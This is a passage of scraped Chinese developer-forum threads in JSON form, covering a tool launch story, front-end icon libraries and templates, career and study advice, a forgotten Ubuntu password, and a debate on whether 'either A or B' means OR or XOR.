2008年，我的父母为了我能转计算机专业四处求人，我亲眼目睹了我的父亲为了讨好校领导而各种卑躬屈膝，结果我并没有转成。也许一切都是命，但是我不甘心，我要改变命运，我要通过努力来证明自己，虽然我不是科班出身，但是自己选择的路跪着也会走下去。\r<br>       2009年，我把学生会部长的职务辞了，我要闭关，专心研究c++，噢！对了，那一年，我还喜欢上了一个女生，山有木兮木有枝，心悦君兮君不知大概就是表达我当时的心境吧。\r<br>       2010年，身边的很多人都在疯狂的玩耍着，而我喜欢的那个女生要过生日了，我知道她喜欢看小说，熬了几天的夜用尽毕生功力为她编写了一个小说下载管理阅读软件，等到过了一段时间我帮她修电脑的时候，发现这个软件已经默默的躺在她电脑的回收站里了。我当时觉得可能这辈子都不会有人喜欢我了吧。\r<br>       2011年，我要毕业了，为了证明自己，我几乎把当时能面试到的大公司都面了一边，并且几乎都顺利拿到了offer，但是我觉得还不够，我决定去魔都，我要变得更强！\r<br>       2012年，魔都这个浮躁的大都市似乎影响了我，我的心也变得不定起来，在公司高负荷的压力下我在技术上也没有之前的那种追求了，每天看到的想到的都是别人怎么怎么样，走了什么捷径，赚了多少快钱！我又一次迷茫了！\r<br>       2013年，一个朋友点醒了我，他跟我说：“当你以后七八十岁，在床上已经动弹不得的时候，你回想一下，在你人生的岁月里，是否有什么事情让你值得去回味，让你值得去骄傲，让你是面带笑容的！”。这句话犹如一个棒槌一样狠狠的敲打了我，我忙忙碌碌了二十多年，但却没有几件事情能让我去回味，让我微笑，更让我骄傲的。那我这一辈子岂不是白活了，那一霎那我突然觉得我需要做点什么，改变什么，我不想就这么浑浑噩噩的了此一生，人生就像一场旅行，至少证明我曾经来过。于是我为了挑战自己，选择了当时很有潜力的移动端，转行做了ios，并且很快被提升为移动端组长。\r<br>       2014年，移动端浪潮来袭，我们这一行的身价也水涨船高，到处都是o2o，b2b，b2c，大家都在谈论创业，融资，我和朋友一起利用业余时间组建了一个小团队，想开发一个手游，瞻仰下移动互联网的势头，只是踌躇满志后因为经验不足很快就失败了。\r<br>       2015年，这一年我26岁，是我人生中至关重要的一年，我结婚了，很高兴自己找了一个我喜欢也喜欢我的女生，以后前进的路上不再形单影只，我更懂得我肩上的责任，不光为了自己，也是为了她每天的微笑！\r<br>       2016年，移动互联网泡沫破灭，大量的公司裁员倒闭，开发者们哀歌四起，很庆幸这个时候我跟对了一家公司，也特别感谢我的同事和领导对我的支持和器重，让我从组员升到组长，从组长升到主管，从主管一直到总监！\r<br>       2017年，回首往事，明白人生种种不易，当年壮志凌云，遥想金戈铁骑，如今却只想简简单单的把一件事情做好，老婆孩子热炕头。于是我们团队做了接口管理平台这样一件小而美的事情，文档自动生成，接口智能调试，内外网支持一应俱全，鉴于自己之前移动端和后端的相关经验，也能更好的理解前后端开发者们在对接接口的时候种种艰辛，平台在团队内广泛应用后，我决定把它开放出来给大家使用，也是为了能让我们在开发的种种艰辛下抱团前行。\r<br>       我把他取名为SBDoc，是因为我们曾几何时，是不是都有过一段傻逼的岁月，为了心头的那份念想坚持着，无论对于过去还是现在，我也希望自己能像个SB似的把这个产品做到极致！\r<br>       互联网寒冬，希望这款产品能在这冬意里温暖下你的心窝！\r<br>       产品地址： <a target=\"_blank\" href=\"http://123.57.77.6/\" rel=\"nofollow\">http://123.57.77.6/</a>  产品文档： <a target=\"_blank\" href=\"http://123.57.77.6/help/help.html\" rel=\"nofollow\">http://123.57.77.6/help/help.html</a>  目前sbdoc.cn域名正在备案中，等备案下来后产品开源！</div>"], "reply": "5", "tittle": "SBDoc:圆我们一个小而美的梦", "comment": ["18 天前就已经发过贴了。现在讲道理应该早就备案完了吧？？", " 遇到一些问题，在二次备案", "有两个很实用功能的建议：\r", "\r", "1. 添加多语言示例代码生成\r", "2. 添加 curl ／ httpie 调用命令行生成", "这个域名。。。", "号外号外 SBDoc 今日重大更新 1.强化了 mock 数据的功能 ，内网测试脚本加入了 mock 数据的功能，可以自定义 mock 的接口，前后端开发平滑过渡 2.添加了 json 格式的展开和折叠操作"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p><img alt=\"qute.png\" src=\"https://ooo.0o0.ooo/2017/02/02/58934fce213a2.png\">\n据说无意搞事的程序员将不会被解雇,不过将会有--惩罚--,就是看 10 个小时这个高清视频.<br>\n视频网站不太吼啊,我打了下码,如果亲自去看....<br>\n<a href=\"https://www.youtube.com/watch?v=jIQ6UV2onyI\" rel=\"nofollow\">好孩子看不见</a><br>\n<a href=\"http://www.nyan.cat/\" rel=\"nofollow\">*孩子看得见</a>,这个是浏览器版本..<br>\n我怎么觉得挺<strong>有趣</strong>的?</p>\n</div></div>"], "reply": "4", "tittle": "Gitlab 无意搞事程序员后续", "comment": ["这跟程序员有啥关系啊", "有趣", "想起有一阵给 V2EX 加这只猫。", "提神效果很好"]},
{"content": "", "reply": "13", "tittle": "除了 font awesome，还有什么流行的前端图标库", "comment": ["- Font Awesome\r", "- Foundation\r", "- Zocial\r", "- Ionicons", "\r", "自己搜吧", "推荐阿里的 ", " 相当强大", " 没搞明白授权", " 好强大", " 差不多够用了", "现在一直用 MaterialIcons", "我的收藏夹里有这么多。。。。你挨个感受一下吧！\r", "\r", "\r", "\r", "\r", "\r", "\r", "\r", "\r", "\r", "MaterialIcons\r", "同推荐 ", " 好东西", "虽然 font awesome 很叼，但是如果你只想用其中的一两个，也得全部引过来，字体文件也 80k 呢  \r", "然后如果其中没有你要用的，就 gg 了   \r", "所以说，还是 iconfont 好，自己选，然后调试的话，就用自动生成的 css 地址就行了，然后图标也是能自定义改的，唯一的缺点就是有时候会炸，比较慢。", "svg sprite 才是真王道哈哈"]},
{"content": ["<div class=\"topic_content\">对你没看错.是自动发红包脚本.\r<br>\r<br>1) 基于 M onkeyRunner 这个 Android 开发测试工具\r<br><a target=\"_blank\" href=\"https://developer.android.com/studio/test/m\" rel=\"nofollow\">https://developer.android.com/studio/test/m</a> onkeyrunner/index.html\r<br>2) 针对 1080 x 1920 的设备测试过.\r<br>3) 想玩的自己调整参数 , 主要是红包总数, 红包个数, 红包金额.\r<br>4) 不知道为什么 留言无法使用 `type` 输入, 不知道是不是输入法的问题.我没多测.留空\r<br>5) 由于我没有找到微信小额支付免密的功能, 而且无法通过 `type()` 方法输入, 所以支付密码的输入也是通过模拟点击输入的.\r<br>这里要玩的话,需要自己修改输入密码的坐标. (注意不要把密码坐标分享出去哦.)\r<br>\r<br>\r<br>脚本如下:\r<br><div><a target=\"_blank\" href=\"https://gist.github.com/banxi1988/58996cf1605795b608c4e61328abe72f\">https://gist.github.com/banxi1988/58996cf1605795b608c4e61328abe72f</a> <button onclick=\"lazyGist(this)\"> 显示 Gist 代码 </button></div></div>"], "reply": "7", "tittle": "[无聊][恶搞] 分享一个 Android 版 微信自动发红包的脚本", "comment": ["要是自动抢红包还可以。有谁愿意在自己不知道的情况下发红包。 XD", "  需要自己控制,\r", "事实是需要有一定的编程能力发能运行此脚本.\r", "要安装  Android 开发者工具命令行才能运行此脚本.\r", "要修改一些坐标参数,才可以自动输入支付密码.\r", "所以,不会在自己不知道的情况下发红包的.", "大哥，你这个是完全按照坐标来点击的，不靠谱啊。。。。建议你学习一下 appium ，很方便", " 对于这种小场景来说,使用坐标也挺方便的. 再说这个只是玩玩. 不用太在意.", "为什么要自动发红包…", "这样的话，完全可以录制一个脚本呐，。。", "不知道是楼主发红包的速度快，还是抢红包的速度快"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p><a href=\"http://www.shenjianshou.cn/\" rel=\"nofollow\">http://www.shenjianshou.cn/</a></p>\n<p><a href=\"http://www.5wei.com/\" rel=\"nofollow\">http://www.5wei.com/</a></p>\n<p><a href=\"http://www.eatjoys.com/\" rel=\"nofollow\">http://www.eatjoys.com/</a></p>\n<p><a href=\"http://www.aiweibang.com/\" rel=\"nofollow\">http://www.aiweibang.com/</a></p>\n<p>这几个网站首页都类似，有谁知道使用了什么模板吗，推荐一下，谢谢。</p>\n<p>PS ：最好是 bootstrap 模板。</p>\n</div></div>"], "reply": "23", "tittle": "有谁知道这几个网站使用了哪些前端模板", "comment": [" bootstrap 这网站的首页相当好 每个插件都分组排好了 剩下的就是抄 css 了", " 知道是哪个 bootstrap 模板吗", " 手动抄太 low 了，有没有现成的模板", "\r", "你 TM 连这点搜索能力都没有么？懒得抄你还懒得搜么？", " 谢谢，查看神箭手源码，看到 iDea 了。", "同楼主，我再加一个 \r", "    \r", "\r", "这个是什么模板，也可能是自己开发的。", "\r", "\r", "这个插件不知道符不符合你的要求。", "wappalyzer 你值得拥有", " css 和 js 写在页面里不太讲究", " 自己开发的，查看源代码就知道了", "直接扒不就好了。。。\r", "\r", "不懂啊", "都是前端大神，第一次看到前端这么多黑技术，谢谢大家。 @", " 分享的链接查不出来网站使用了什么模板，不知道 wappalyzer 能不能查出来。\r", "\r", "目前得到的答案， shenjianshou 可以从网站源码里面看到采用了 iDea 模板， iDea 是收费模板，自己学习暂时不想花这个钱。\r", "\r", "欢迎大家继续回复，如何获取前端使用了什么技术，有哪些模板和 iDea 或者这几个网站的类似。谢谢大家！", "wappalyzer 说他们大都用了 owlcarousel", "哪位帮我看看这个用的是什么架构？\r", "\r", "一直没搞明白，多谢", " WordPress...", " 你摸着良心说，你这样打广告好意思吗\r", "这个站明明就是你自己的站，还说不知道用的什么架构", " 你摸着良心说，你这样打广告好意思吗 \r", "这个站明明就是你自己的站，还说不知道用的什么架构", "   你摸着良心说，你这样打广告好意思吗 \r", "这个站明明就是你自己的站，还说不知道用的什么架构 \r", "\r", "themes/Rainbow-Premium/style.css \r", "最没技术含量\r", "主题下载链接： ", " 你摸着良心说，你这样打广告好意思吗 \r", "这个站明明就是你自己的站，还说不知道用的什么架构", "第一个网站响应式布局做的很差，有个 card 的栅格大小居然用错，第二个网站底部有白边没去掉，强迫症受不了。第三个没有做响应式布局，第四个比较完美。", " 虽然你有装逼嫌疑，但是黑科技还是好厉害的，科普下原理？给你个赞赏 :)", " #11 好玩～"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>有时候修改 html 时不小心多删除了一个 div 或者加了一个 div ，这时如果浏览器报错就有可能需要在一片区域一个个标签看过去，不知道有没有方便的检查未配对标签的工具或者排错方法？</p>\n</div></div>"], "reply": "18", "tittle": "如何快速找到未闭合的 div 标签？", "comment": ["sublime text 可以，但是我不清楚是原生的还是 BracketHighlighter 插件带的", "验证一下 HTML 代码： ", "审查元素我觉得很方便查出来啊？折叠起来很明显能看出来", "如果平时注意代码对齐，很容易就能看出来哪里缺了。", "格式化代码..", "都不用提 IDE ，就普通编辑器也应该有语法错误提示的吧，未闭合标签会有醒目标志。", "hbuilder 右键验证文档语法", "还是保持一个好的代码习惯吧，保持对齐，能一眼看到哪儿没闭合。", "ide 的话，像 webstorm 会有语法校验，不合格会有 warning 提示", "问题在于，浏览器不会对 HTML 报错", "用 IDE 可以，但是没有 IDE 呢？例如 vim...\r", "\r", "对齐也可以，但是有时候缺少的 div 被别的 div 补位了！一眼看去只有文档最后才少了个 div\r", "\r", "我的办法是，代码功能区块起始和结尾写中文注释，外加代码格式化，可以保证快速定位。例如：\r", "\r", "<!-- 产品单元开始 -->\r", ".....\r", "<!-- /产品单元结束 -->", "刚遇到，写了个<a> <a>\r", "闭合没有加 / \r", "找 bug 花了些时间", "Firefox 查看源代码如果关闭不正常 div 就是红色字体", "lint or hint", "用 IDE 做开发，从来就不需要担心这个问题\r", "就算用 Editor ，主流的产品也都有相应插件来检查", "主要是不见得是自己开发了，是帮别人填坑，自己手写的当然没问题。", "我一般用正则把有包含的都删了 然后找单独的 div", "一般直接预览，页面能正常现实就行。管他闭不闭合。不能正常显示了再慢慢找。", "用这个插件\r"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>20 岁男性\n首先毕业已经半年了，从实习时做页面重构到现在的 JS 开发， 但是上个星期莫名去报了专插本，但是最近想想也比较纠结，不知道浪费两年多工作经验去全日制学校插本好么。</p>\n<p>之前让我产生去专插本的考虑是</p>\n<ol>\n<li>因为在专科时期有些许焦虑，固步自封，导致每天好像都在学习做无用工，所以毕业后没什么朋友。</li>\n<li>对现状还是不太满意， 毕竟很多不错的公司都没有面试或进入的机会，一直在小公司转悠，各种不规范</li>\n<li>想要尝试不同的更有趣的领域，例如 VR, WebGL ，可能会对学历知识层面比较有要求 所以想学习更多的东西，遇见更多的人</li>\n<li>大专时没有去考英语证书，所以担心以后会被局限</li>\n</ol>\n<p>而目前让我产生不去专插本的考虑是</p>\n<ol>\n<li>害怕又在本科院校混日子，每天除了上课，就是宅在宿舍</li>\n<li>学校教的东西和工作用的东西几乎没什么太多关系，一些理论的东西自己在平时了解学习觉得也可以</li>\n<li>觉得到本科院校两年后毕业依旧会选择这个职业，不如在工作上进行提高</li>\n<li>目前也没有太多的时间和心情用于复习上，而且高数什么其实也忘得差不多</li>\n</ol>\n<p>====\n对于目前自己的发展， 一直考虑往前端开发(全栈)，业余游戏开发走。\n所以会不会把时间用在个人相关能力的提高上会比较好。</p>\n</div></div>"], "reply": "18", "tittle": "毕业半年去专插本好么", "comment": ["...up", "找得到工作的话就别去了", "  算上实习已经工作一年了", "我觉得，除非现在的工作实在是太好，否则还是应该尽可能的去继续学习", "我觉得可以，虽然老师或上课可能不能给你很多帮助，但好处是相对自由发展的机会更多。而且你也说小公司有不规范的地方，这样自学、做项目可能更好。", "我擦，你看我的帖子，我现在就是这种困境，然后表述不当被喷了", "坐标江苏, 大三转本狗, 去年下半年刚转入本科学校。\r", "刚刚过去的半年, 忙忙碌碌地就过去了。时间紧, 课程多, 随之带来的结果是考试的科目也多。当然, 想混日子还是可以的, 不就是平时上课玩手机, 作业随便抄抄么...\r", "感觉我周围的人更多的还是在混日子, 混到毕业拿个本科学历走人...\r", "因此, 班级里面同学的专业水平也就不必说了吧, 一个 C 语言的课程设计, 能独立完成的屈指可数, 况且还有部分人专科的专业还是软件工程的...\r", "其实说到底, 这个主要还是看你对于本科学历的在意程度。如果想拥有一个认可度比较高的本科学历, 那么就选择走这条路, 尽管会花费不少精力财力;否则, 就选择工作, 或者以后需要时再去自考本科。", "我觉得读书是自由，在象牙塔可以有充足的自由完成自己想做的事情，提升自己。（这也是我准备考研的原因之一", " \r", "如果说我比较喜欢在工作中写代码的感觉，而且家里经济也一般。  也想过两年后考在职研究生也是个选择", " \r", "我觉得你的言辞是激动了些= =", " 总的来说，只要不在学校或者外面混日子，都是不错的。如果家里支持和允许你继续读书，还是应该坚持读书，毕竟是低成本高收益的一个渠道。加油～", " 2333333 ，怎么没收到你的回复，是一开始的文章还是回复？留个联系方式聊聊？ base64 ？： P", " 选择的学校是不是很少，几率大吗？二本 or 三本？", "上学并不影响技术啊， github 那么多开源项目，上学时间又充足，毕业拿本科+加上开源项目，你觉得进好公司还差什么？", " 这是今年江苏的相关招生计划:http://www.ec.js.edu.cn/art/2016/12/30/art_4266_204077.html\r", "其实只要认真复习备考，应该都能考上，差别只在于学校的好坏\r", "至于其他省，那就不知道了，毕竟每个省政策不一样", " 好的谢谢", "  留个联系方式我加你吧，可以聊聊么 XD", " UVE6MTAxODnigJTigJQxNTA2Ng=="]},
{"content": ["<div class=\"topic_content\">SourceTree for Windows 终于要提升性能了~\r<br>\r<br><a target=\"_blank\" href=\"https://www.oschina.net/news/81381/sourcetree-for-windows-2-0-beta\" rel=\"nofollow\">https://www.oschina.net/news/81381/sourcetree-for-windows-2-0-beta</a></div>"], "reply": "目前尚无回", "tittle": "SourceTree for Windows 2.0 beta 发布,大幅的性能提升", "comment": []},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>请教下过来人的经验，工作几年后再读研究生有没有后悔的。\n比如当初应该直接读研而不是工作几年后再读。。。</p>\n<p>你们读完后都几岁了？年龄对找工作的影响大吗？</p>\n<p>我碰到过的是工作几年(大于 5 年)后回学校读博然后走 faculty 这条路的，这对年龄没有限制，知道的两个都混的很不错（幸存者偏差？）</p>\n<p>我想知道下，如果之后不是做 faculty 而是去工业界混呢？</p>\n</div></div>"], "reply": "34", "tittle": "有没有工作几年后再读研究生的？", "comment": ["工作两年后读的研究生，后悔了， 5 年，房价涨的想哭", "可以去美帝读个 master 做跳板", "有不少工作几年然后去美帝混个文凭的吧，再在美帝的 IT 公司混两年，回来都有不错的位置了", "工作今年第 5 年，想去日本读个研。。然后留那边。。估计读完 30 了。。纠结中！", "之前有这想法，但是转软件后感觉读研没预期那么有用", " 有想法就去做，一纠结就更晚了", "还有读好几个 Master 的，尤其是那种 9 个月、 1 年的项目，性价比还是不错的", " 读完才 30 的话 还纠结啥。。。赶紧去", "不用纠结，只要注意一点：不要读 211 以下的学校。", "国外软硕应该可以考虑下，\r", "\r", "不过职业发展方向 如果是工程方面的话，\r", "在国内进一步读研，确实有点不划算，\r", "\r", "分析两点：\r", "\r", "一来，是软工注重实战，偏学术研究的少，\r", "你读 3 年硕士，比不上人家主导了一个上千万的项目，\r", "当然这其中也要衡量各种机会成本，不是绝对的\r", "\r", "二来，如果你搞深度学习 模式识别 图形图像算法之类的，那第一条当我放屁\r", "国内搞这些方面的 NB 学校，招考竞争压力大，你工作之后 跟那些刚毕业的竞争 好学校比较难，\r", "研究这些方向，要是读个一般的学校 还不如不去", "不值，房价升值的程度要比个人提升的大。", "再干 1 年拿到德国永久居住权，会考虑拿个 Master ，国内的本科文凭想拿好的 offer 有点吃力。", "r#12 @", " #12 肉身翻墙不具备参考价值", " 我一位师兄，研究生毕业 3 年后，在日本重新通了一遍关， 30 岁修士、 34 岁博士、 4 年博士后、 3 年特任助教、现在助教。", " 。。。", "打算先买套房再出国读研", "认识一个，考上了北邮", "不移民就别读了，要读就读准备移民国家的硕士", "25 岁时读的，谈不上后悔吧。\r", "\r", "功利点说，现在国内硕士研究生的价值确实不高就是了。\r", "\r", "不过确实不如早点结婚买房的。", "我就是，明年毕业，但我不是程序员", "毕业两年半后考了在职研究生，非全日制。坐标魔都某 985 院校，软工。\r", "\r", "17 年开始和全日制一起考试，可以拿双证，不过就读时间翻了一倍。\r", "\r", "楼主你真要学点东西还是出去吧，不过要规划好。\r", "\r", "如果家庭基础一般观念又比较传统的建议别折腾了，国内读个 985 算了。", "工作 3 年以后去读的...现在毕业不到两年，就工资来衡量没以前多...不过获得了一次转职的机会", "读研之前先掂量你数学行不行 不行读了也白扯 以后需要学历的读在职 mba 吧", "我也 don't know 啊， lz 要不要随便找一个方向 try for it ？", "2014 年毕业，工作两年，今年 1 月份来新加坡国大读软件工程的硕士，今天腊月二十九了还在苦逼地上课...\r", "\r", "我们这个 program 一年半，比一般的长一点，但是包括八个月的实习，实习是接手学校合作企业的实际需求，所以我觉得性价比还可以，肯定比国内浪费三年时间强。\r", "\r", "我的想法其实很简单，就是想来安个家，以后就算不换国籍，拿个 PR 也是好的。虽然现在女朋友都没有，但是想给以后的老婆孩子多一个选择，不管是工作、生活还是教育方面。\r", "\r", "工作之后读研，感觉就是目的性更明确了，我很清楚我要什么，而不是像刚毕业的本科生那么懵懂。这边也有很多三四十岁甚至头发花白来读硕士的，可能跟国内观点不同吧，英联邦的教育体系里硕士就是个过渡和加强，你觉得能力不足了，随时可以来充充电。", "为什么要扯到买房？买房和读研有毛关系 ... 我有同学大一来就买房了 ...", " 赞同", " 可以读机器学习", " 也想去日本读个研究生，不知怎么个流程", "我就是啊，现在正在悉尼大学读 master of data science 。平时上班不是很忙，然后又参与了实验室里面一些项目感觉很充实。\r", "\r", "其实人和人不一样，我不是那种觉得有钱就牛气的人，更喜欢充实自己，所以才选择这么一条道路。有多少房，不如有我快乐。", "@所有说买房的人\r", "\r", "16 年毕业生，心好累，放弃保研依然没有赶上房价的末班车。", " 请问您是 25 开始读的，还是 25 读完的？", "来北美读研的印度人里面，很多（如果不是大部分）都有两年或者以上的工作经验。", "个人觉得其实是你愿不愿意读研吧，年龄不是问题，比如今年某课组队的小伙伴，大女儿都上幼儿园，小女儿快满一周岁了，可人家还是就读于国内某著名 985 。对了，说明下，今年研一。。"]},
{"content": ["<div class=\"topic_content\">我终于领教了什么是手贱了\r<br>刚才准备下班过年，想把电脑系统登录密码给换了\r<br>用的是 Ubuntu 14.04 ，输了好几个密码都说强度不够，于是就点了个随机密码。为了安全起见，我用手机拍了下来，然后又复制粘贴到印象笔记。\r<br>但是我锁定电脑重新登录时怎么输都显示密码不正确。刚开始一两次我以为自己输错了，后来我对着印象笔记和手机拍的图片睁大了狗眼一个一个字符输入，还是提示密码不正确！\r<br>现在我只能带着怨念坐在班车上了。\r<br>我比较纠结的是，究竟发生了什么事？请各路大神明示</div>"], "reply": "22", "tittle": "手贱~谁能告诉我为什么我密码不正确", "comment": ["全角半角？", "single user 进去改密码。。。", "大小写？", "是不是栽在 I 和 l 上了?", "红帽的密码如果强度不够的话可以点两次确定强制设置 ", " ", "14 好用还是 16 好用", "原密码试试", "上一次碰到这种事是因为键盘坏了", " 有次折腾 fpga ，怎么都不对，后来发现板子上有个微动开关坏了。。", " 我们 IT 建议 14 ，因为我们经常需要编一些包，担心 16 兼容性不好", " 我用的是宇宙最强的键盘——戴尔电脑标配薄膜键盘 T_T", " 有可能！我年后回去试一试！！", " 还有这样的？！我的是 ubuntu ，强度不够按钮一直灰显:-(", " 试过了，不行:-(", "大学时候一样遇到过，一样未解之谜。\r", "后来大白菜，删除登录密码。😄", " 我也觉得登录密码没什么鸟用，出于职业习惯一直用着", "熟悉启动参数的话进单用户模式\r", "或者任何 linux 启动盘 chroot 改，就是几分钟的事", "大写用 Shift 不要用 Caps Lock ，试一下。", "也有可能是密码长度问题，好多说最大 16 位密码，但是等输入的时候就会惊奇的发现，最多只能输入 14 位", "如果是笔记本键盘的话还有 Numlock 的坑。", " 果然是 I 和 l 弄混了，能进系统了，哈哈，我真是个二货", " 😄"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>今天被同事问到,然后,我答错了... :-(\n被告知答案后..服气.</p>\n</div></div>"], "reply": "57", "tittle": "你不假思索第一反应回答: \"Either A or B\" 翻译成开发中的逻辑关系是?", "comment": ["if A\r", "else B", "A || B", "  您这不是逻辑关系,  问题是需要个 logical operation", " 跟我回答的一样....", "(A&&!B)∥(!A&&B)", "A | B\r", "\r", "英文中 Either 的意思是 两者其中只要有一个满足就可以。\r", "所以可以存在的情况是,  A 为真， B 为真， 或者 A 和 B 都为真。\r", "\r", "上面写的 if 肯定是不对的，\r", "|| 有可能因为编译器 的 boolean 短路， 所以也不完全对。", " \r", "?", "就是 A or B 啊... AB 中至少对一个就对\r", "不仅我们 CS 是这么教的，我们哲学里的逻辑也是这么教的。", " 短路为什么不对... 不还是对的么... A 对 a || b 就肯定是对的了呀", "a 或 b   a | b  但是楼主答案是什么呢？强迫症要命啊", "不是或么？或就是||啊", "if ((a && !b) || (!a && b))", " \r", "A || B  ==> 编译器 先检查 A ， 如果为真， 就不会管 B 的值了（假设 B 有可能在真和假之间)\r", "A |  B ==> 涵盖 A 为真 ， B 为真 或者 A 和 B 都为真。。\r", "好吧。。明白你的意思，是我有点较真了。", "  答的对, 应该是 XOR , \r", "\r", "\"either a or b\"   意思是:   A B 之中有且仅有一个是真.", "刚忘记了引用一下:\r", "\r", "either-or\r", "adjective [ before noun ] UK ​ /ˌaɪ.ðərˈɔːr/ /ˌiː.ðərˈɔːr/ US ​ /ˌiː.ðɚˈɔːr/ /ˌaɪ.ðɚˈɔːr/\r", "​\r", "used to refer to a situation in which there is a choice between two different plans of action, but both together are not possible:\r", "It's an either-or situation - we can buy a new car this year or we can go on holiday, but we can't do both.", "rand() % 2 == 0 ? A : B", "  多谢, 原来我一直理解的是错的.", "异或。。。你得港清楚这是逻辑运算还是。。。", "either A or B 使用的语境一般是在 A 和 B 有且只有其中一个为真（而且不会有 A 和 B 之外的可能）的情况下，比如说：\r", "\r", "A red-black tree is a binary search tree with one extra bit of storage per node: its\r", "color, which can be either RED or BLACK.\r", "\r", "要储存一个节点的红黑属性，只需要一个 Boolean 变量就足够了，非黑即红。\r", "\r", "但是这似乎没法直接翻译成一个逻辑表达式。", "其实就是异或， A^B", "  在你说的这个 context 里, 肯定是非红即黑, 但是 either A or B 有可能判定 4 种情况的结果, 就是 AB 分别为 TT, TF, FF, FT,  A xor B 可以根据这四种输入来做出判断.\r", "\r", "这个问题的由来是, 我在公司做了个东西, 简单说, 就是个用户的输入判断, 有 4 个输入框, 分两组(A B) (C D), 要求是要么 AB 都填, 要么 CD 都填, 当然全空或者穿插缺项, E.g. (AC  or BD) 是要提示错误.\r", "\r", "然后同事在使用中发现, 如果 ABCD 全填了, 我就处理 AB 被填的那个逻辑去了, 他觉得应该是提示错误信息, 我说这不是个 or 的关系吗, 他说, it is not an \"or\" relation, instead it is an \"either-or\" relation.  我说, 对啊, 那不也是 logical OR 吗? 他说 are you sure? it is XOR.. 我仔细一想, 人家说的对啊......", "Either[A,B]", "异或吧", "异或", "要么 A 要么 B", "这种情况说 Exactly one 或者 One and Only One 比较合适吧\r", "\r", "至于 either 并不能很准确的表示二者之一这个意思……", "这个其实是英语题吧……", "Determiner[edit]\r", "either\r", "Each of two. [from 9th c.]  [quotations ▼]\r", "One or the other of two. [from 14th c.]  [quotations ▼]\r", "(coordinating) Used before two or more **not necessarily exclusive possibilities separated by \"or\"** or sometimes by a comma.  [quotations ▼]\r", "\r", " 其实是英语题，本来说啥都对的啊，后来这个问题被问得多了，连我们 CA 老师上课时候都讲这个逗我们，现在在贵圈 either 的意思就缩小成这样了……", "上技术社区考了一个英语题……", "\r", "\r", "Either/Or and related terms may also refer to:\r", "\r", "Logical disjunction, the logical meaning of \"either ... or ... or both\"\r", "Exclusive or, the logical meaning of \"either ... or ... but not both\"\r", "\r", "可以指逻辑析取（逻辑或），也可以指异或。这个其实有歧义。", "这是一道英语题。", "平常所说的的 or ，中文的或，大多数情况下都是编程语言中的 xor ，这点很坑。", " 这个其实是集合的运算符，不过其实都差不多", "各位英语捉急啊,英语中 either 的逻辑与 both 意义等价. Either A or B 的逻辑意义是 A 和 B 必须都为真.若任何一个为假,则不能用 either\r", "所以是 A and B", " 喷了，哥们你是在钓鱼对吧", " 我觉得 either 和 both 是不同的。\r", "\r", "either A or B == both A and B?", " 你被钓鱼了。。。", " \r", " \r", "开玩笑,各位这么认真,语言上的东西没必要这么较真啊.\r", "\r", "从语法的理论上讲,这样分析应该是没错的. \r", "陈述句举例: Either this apple or that apple is bad == Both apples are bad.\r", "\r", "实际应用中最正确的回答是\"随语境\".\r", "因为 either or 可以用在陈述句中使用,也可以用在选择句中,而有的选择句中强调必须择其一,有的则不限制必须择其一.\r", "\r", "就像\"i++i+i++i+++i\"的结果一样,答案是随编译器而定的", " 哥你不是在开玩笑的样子……\r", "\r", "你在说 and 和 or 没区别，视编译器而定，是吗", " \r", "```\r", "Either this apple or that apple is bad == Both apples are bad. \r", "```\r", "Are you serious?", "data Either a b = Left a | Right b", "所以直译应该是 不是 A 就是 B 吗？这样好像就排除掉 Both True 的 case 了(突然觉得中文博大精深啊！", " 有些 formal logic language 是以 \\oplus 作为 XOR 的逻辑符号的嘛", "A V B\r", "/or 符号打不出来，用 V 代替。离散数学基础啊兄弟们", "如果是 exclusive or 一般都会注明的，默认就是||我觉得没问题", " \\lor 或者 \\vee 可以打 ∨ (U+2228)", "stack exchange 上的两个答案\r", "\r", ">It isn't always actually used with full precision, though, so, as usual, context has to be taken into account. If somebody says, \"select either A or B\", for example, they definitely mean that you should not select both. If they say \"if either A or B is true\", though, they probably mean a non-exclusive OR, and the condition is still true if both A and B are true.\r", "\r", ">Usually, the inclusive sense is used in mathematics and the exclusive sense in everyday life. In any case, further specification or context will remove any doubt.\r", "\r", "所以如果是 choose either A or B 这样那肯定就是 xor 了，但其他情况看语境也可能与 or 同义\r", "\r", "\r", "还有 ", " 给了同样的解释：\r", "\r", ">In every day language we use the phrase \"either A or B\" to mean that one of the two options holds, but not both.For example, when most people say something like ``You can have either a hot dog or hamburger,\" they usually aren't offering you both. The use of ``either/or\" in everyday English is usually divisive, and meant to imply there are only two options: A or B, but not both A and B. (The use of \"or\" in this way is sometimes referred to as \"exclusive or.\") \r", "\r", ">However, the use of \"either A or B\" in mathematics allows the option that both A and B hold. (The use of \"or\" in this way is sometimes referred to as \"inclusive or.\") For example, in mathematics, the statement \"If x is a real number, then either x≤0 or x≥0\" allows the possibility that x satisfies both x≤0, as well as x≥0 (which is true of the real number 0).", "特别是 \"either A or B is true\" 这种判断逻辑的情况，很有可能应该等同于 or 。\r", "\r", "\r", "\r", "**On the other hand, \"Her grades are so good that she's either very bright or studies hard\" does not exclude the possibility of both.**", "我的第一反应就是: A or B ... (Python)", "assert a or b", "bool either(bool A, bool B);\r", "\r", "either(A, B);", "根据剑桥的解释：\r", "used to refer to a situation in which there is a choice between two different plans of action, but both together are not possible:\r", "It's an either-or situation - we can buy a new car this year or we can go on holiday, but we can't do both.\r", "就是可以其中一个为真，结果为真，但是不能都为真。", "凭我的经验英文中的 either 不带 both ，老美会说 either A or B, or both 。所以应该是 (A && !B) || (!A  && B)", "!A != !B", "$a or $b|Or|TRUE if either $a or $b is TRUE.\r", "$a xor $b|Xor|TRUE if either $a or $b is TRUE, but not both.\r", "\r", "世界上最好的语言如是说。", "xor"]},
